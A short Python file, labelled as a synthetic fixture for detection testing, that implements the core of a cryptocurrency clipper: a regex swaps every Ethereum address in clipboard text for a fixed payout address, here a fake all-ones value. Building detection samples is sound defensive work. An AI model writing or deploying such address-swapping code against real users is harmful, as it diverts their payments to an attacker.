# FIXTURE ONLY — synthetic detection test sample, not real malware
# A clipper helper in Python: every Ethereum address in the clipboard text is replaced with a
# fixed one before the caller writes the text back. The address is fake (all ones).
import re

PAYOUT = "0x" + "1111111111111111111111111111111111111111"
ETH_ADDRESS = re.compile(r"0x[a-fA-F0-9]{40}")


def rewrite_clipboard(clipboard_text):
    return ETH_ADDRESS.sub(PAYOUT, clipboard_text)
